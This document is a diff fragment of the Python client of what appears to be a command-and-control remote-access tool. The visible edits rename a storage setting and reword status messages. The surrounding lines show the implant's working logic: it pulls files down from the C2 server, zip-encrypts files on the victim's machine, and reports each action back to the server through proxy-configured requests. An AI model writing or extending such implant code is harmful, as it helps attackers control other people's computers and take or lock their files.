@@ -19,7 +19,7 @@ from pyzipper import AESZipFile, ZIP_LZMA, WZ_AES
 from encryption import cipher
 # Settings Variables(Constants) Importing
 from settings import (CMD_REQUEST, CWD_RESPONSE, RESPONSE, RESPONSE_KEY, FILE_REQUEST,
-                      C2_SERVER, DELAY, PORT, PROXY, HEADERS, FILE_SEND, ZIP_PASSWORD, STORAGE)
+                      C2_SERVER, DELAY, PORT, PROXY, HEADERS, FILE_SEND, ZIP_PASSWORD, INCOMING)
 
 # If Client have Windows OS
 if system() == "Windows":
@@ -197,7 +197,7 @@ while True:
                     headers=HEADERS, proxies=PROXY)
 
             # Notify us on the server that the file was downloaded
-            post_to_server(f"[+] Client: {filename} is now Uploaded to {STORAGE}/{filename} on the {client}.\n")
+            post_to_server(f"[+] Client: {filename} is now Uploaded to {INCOMING}/{filename} on the {client}.\n")
 
         # Exception Handling Common Errors maybe occurs
         except FileNotFoundError:
@@ -228,7 +228,7 @@ while True:
                     post_to_server(f"{filepath} on {client} is a directory. only Files can be zip-encrypted. \n")
                 else:
                     zipFile.write(filepath, arcname=filename)
-                    post_to_server(f"{filename} is now Zipped and Encrypted in {filepath} on the client. \n")
+                    post_to_server(f"{filename}.zip is now Zipped and Encrypted in {filepath}.zip on the client. \n")
 
         except FileNotFoundError:
             post_to_server(f"{filepath} is not found on the {client}.\n")
